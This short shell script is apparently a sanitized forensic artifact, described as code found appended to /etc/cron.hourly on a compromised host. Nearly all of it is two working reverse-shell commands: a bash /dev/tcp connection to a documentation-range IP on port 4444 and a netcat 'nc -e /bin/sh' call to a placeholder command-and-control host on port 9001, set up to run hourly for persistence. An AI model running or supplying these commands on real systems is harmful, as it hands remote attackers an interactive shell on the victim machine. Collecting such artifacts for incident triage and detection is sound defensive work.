#!/bin/sh
# Found appended to /etc/cron.hourly on a suspected-compromised host.
# Sanitized for triage; C2 host uses the reserved .invalid TLD.

# Reverse shell via bash /dev/tcp (no external binary needed)
bash -i >& /dev/tcp/198.51.100.23/4444 0>&1

# Fallback: classic netcat reverse shell
nc -e /bin/sh c2.attacker.invalid 9001
